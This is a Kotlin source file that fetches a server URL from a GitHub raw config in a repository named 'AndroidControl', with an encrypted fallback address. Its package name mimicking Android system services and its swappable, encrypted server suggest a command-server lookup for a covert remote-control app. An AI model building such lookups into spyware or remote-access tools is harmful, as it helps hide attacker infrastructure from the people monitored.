package com.android.services

import okhttp3.OkHttpClient
import okhttp3.Request
import com.google.gson.JsonParser
import java.util.concurrent.TimeUnit

/**
 * Fetch server URL dari GitHub raw config — agar bisa ganti server
 * tanpa rebuild APK. Fallback ke SecureConfig jika tidak bisa fetch.
 */
internal object RemoteConfig {

    private const val CONFIG_URL =
        "https://raw.githubusercontent.com/Kztutorial99/AndroidControl/main/android-config.json"

    private val http = OkHttpClient.Builder()
        .connectTimeout(6, TimeUnit.SECONDS)
        .readTimeout(6, TimeUnit.SECONDS)
        .build()

    @Volatile private var _serverUrl: String? = null

    /** Kembalikan server URL dari remote config; fallback ke encrypted default. */
    fun serverUrl(): String = _serverUrl ?: SecureConfig.serverUrl()

    /**
     * Fetch config dari GitHub raw. Dipanggil sekali saat service start.
     * Blocking max ~6s — jalankan di thread terpisah.
     */
    fun fetch(): Boolean {
        return try {
            val resp = http.newCall(Request.Builder().url(CONFIG_URL).get().build())
                .execute().use { it.body?.string() }
            if (!resp.isNullOrBlank()) {
                val json = JsonParser.parseString(resp).asJsonObject
                if (json.has("serverUrl")) {
                    val url = json.get("serverUrl").asString.trim().trimEnd('/')
                    if (url.startsWith("http")) {
                        _serverUrl = url
                        android.util.Log.d("RemoteConfig", "✅ serverUrl: $url")
                        return true
                    }
                }
            }
            android.util.Log.d("RemoteConfig", "⚠️ Fetch OK tapi no serverUrl — pakai default")
            false
        } catch (e: Exception) {
            android.util.Log.d("RemoteConfig", "⚠️ Fetch gagal (${e.message}) — pakai default")
            false
        }
    }
}
